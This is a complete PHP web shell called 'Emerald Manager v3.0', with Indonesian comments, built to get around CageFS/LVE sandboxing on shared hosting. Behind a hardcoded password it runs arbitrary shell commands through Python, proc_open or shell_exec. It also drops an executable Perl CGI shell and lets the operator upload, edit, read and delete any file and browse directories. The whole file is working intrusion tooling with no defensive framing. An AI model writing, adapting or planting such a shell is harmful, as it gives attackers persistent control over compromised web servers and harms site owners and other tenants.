<?php
/**
 * EMERALD MANAGER v3.0 - CageFS/LVE Bypass Attempt
 * Khusus Server dengan Proteksi Binary Ketat
 */
session_start();
$password = 'theremesec1337'; 
$auth_name = 'emerald_v30';

if (isset($_POST['p']) && $_POST['p'] === $password) { $_SESSION[$auth_name] = true; }
if (!isset($_SESSION[$auth_name])) {
    die('<html><body style="background:#000;color:#0f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;"><form method="POST"><h2>EMERALD V3.0 KEY</h2><input type="password" name="p" style="background:#111;border:1px solid #0f8;color:#0f8;padding:10px;"><button type="submit" style="background:#0f8;border:none;padding:10px 20px;cursor:pointer;">AUTH</button></form></body></html>');
}

// --- FUNGSI BYPASS ALTERNATIF ---
function cagefs_bypass($c) {
    $out = '';
    // Mencoba lewat Python (Sering kali Python tidak diblokir sekeras PHP)
    if (isset($_POST['mode']) && $_POST['mode'] == 'python') {
        $py_cmd = "python -c 'import os; print os.popen(\"$c\").read()'";
        return @shell_exec($py_cmd);
    }
    
    // Standar Multi-Bypass (seperti sebelumnya)
    $c = $c . " 2>&1";
    if (function_exists('proc_open')) {
        $ds = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $p = @proc_open($c, $ds, $pipes);
        if (is_resource($p)) {
            $out = stream_get_contents($pipes[1]);
            fclose($pipes[1]); fclose($pipes[2]);
            @proc_close($p);
            if(!empty($out)) return $out;
        }
    }
    if (function_exists('shell_exec')) { $out = @shell_exec($c); if(!empty($out)) return $out; }
    return "FAIL: CageFS/LVE total block. Gunakan fitur 'Create CGI' di sidebar.";
}

$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
@chdir($dir); $dir = getcwd();
$msg = ''; $cmd_out = '';

if (isset($_POST['cmd'])) { $cmd_out = cagefs_bypass($_POST['cmd']); }

// Fitur Create CGI (Bypass lewat folder cgi-bin)
if (isset($_GET['cgi'])) {
    $cgi_code = "#!/usr/bin/perl\nprint \"Content-type: text/plain\\n\\n\";\nprint `id; pwd; ls -la`;";
    if(@file_put_contents("shell.cgi", $cgi_code)) {
        @chmod("shell.cgi", 0755);
        $msg = "CGI created: shell.cgi. Coba akses lewat browser (folder cgi-bin).";
    }
}

if (isset($_FILES['u'])) { if (@move_uploaded_file($_FILES['u']['tmp_name'], $_FILES['u']['name'])) $msg = "Uploaded!"; }
if (isset($_POST['act']) && $_POST['act'] == 'save') { @file_put_contents($_POST['f'], $_POST['c']); $msg = "Saved!"; }
if (isset($_GET['rm'])) { @unlink($_GET['rm']); $msg = "Removed!"; }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Emerald v3.0 - CageFS Bypass</title>
    <style>
        :root { --g: #00ff88; --b: #050505; --c: #101513; }
        body { background: var(--b); color: #ccc; font-family: 'Consolas', monospace; margin: 0; display: flex; }
        .sidebar { width: 320px; background: var(--c); border-right: 1px solid #1f3a2f; height: 100vh; padding: 25px; box-sizing: border-box; position: fixed; }
        .main { margin-left: 320px; padding: 35px; width: 100%; }
        .card { background: #111; border: 1px solid #1f3a2f; padding: 20px; border-radius: 10px; margin-bottom: 25px; }
        input, textarea, select { background: #000; border: 1px solid #1f3a2f; color: var(--g); padding: 12px; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        .btn { background: #008f58; color: #fff; border: none; padding: 12px; width: 100%; cursor: pointer; border-radius: 5px; font-weight: bold; }
        .btn:hover { background: var(--g); color: #000; }
        pre { background: #000; color: #0f8; padding: 20px; border: 1px solid var(--g); border-radius: 5px; overflow: auto; max-height: 500px; }
        .link { color: var(--g); text-decoration: none; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2 style="color:var(--g); margin-top:0;">EMERALD v3.0</h2>
        <div class="card">
            <h3>Terminal Bypass</h3>
            <form method="POST">
                <select name="mode">
                    <option value="standard">Standard PHP</option>
                    <option value="python">Python Attempt</option>
                </select>
                <input type="text" name="cmd" placeholder="Command (e.g. ls -la)" required>
                <button type="submit" class="btn">EXECUTE</button>
            </form>
        </div>
        <div class="card">
            <h3>Advanced Tools</h3>
            <a href="?d=<?= urlencode($dir) ?>&cgi=1" class="btn" style="display:block; text-align:center; text-decoration:none; margin-bottom:10px;">CREATE CGI BYPASS</a>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="u">
                <button type="submit" class="btn">UPLOAD FILE</button>
            </form>
        </div>
    </div>

    <div class="main">
        <?php if($msg) echo "<div class='card' style='color:var(--g); border-color:var(--g);'>$msg</div>"; ?>
        <div class="card"><strong>Directory:</strong> <span style="color:var(--g)"><?= $dir ?></span></div>

        <?php if($cmd_out): ?>
        <div class="card">
            <h3 style="margin-top:0;">Console Output</h3>
            <pre><?= htmlspecialchars($cmd_out) ?></pre>
        </div>
        <?php endif; ?>

        <div class="card">
            <h3>Filesystem</h3>
            <table width="100%" style="text-align:left;">
                <tr style="color:#666; font-size:12px;"><th>NAME</th><th>ACTION</th></tr>
                <tr><td><a href="?d=<?= urlencode(dirname($dir)) ?>" class="link">.. [ Go Parent ]</a></td><td>-</td></tr>
                <?php
                foreach(scandir('.') as $f) {
                    if($f == '.' || $f == '..') continue;
                    echo "<tr><td>";
                    echo is_dir($f) ? "📁 <a href='?d=".urlencode($dir."/".$f)."' class='link'>$f</a>" : "📄 $f";
                    echo "</td><td><a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='link' style='color:#00d2ff'>EDIT</a> | <a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' style='color:#ff4444' onclick='return confirm(\"Del?\")'>RM</a></td></tr>";
                }
                ?>
            </table>
        </div>

        <?php if(isset($_GET['e'])): ?>
        <div class="card">
            <h3>Editor: <?= htmlspecialchars($_GET['e']) ?></h3>
            <form method="POST">
                <input type="hidden" name="act" value="save">
                <input type="hidden" name="f" value="<?= htmlspecialchars($_GET['e']) ?>">
                <textarea name="c" rows="18"><?= htmlspecialchars(@file_get_contents($_GET['e'])) ?></textarea>
                <button type="submit" class="btn">SAVE & UPDATE</button>
            </form>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
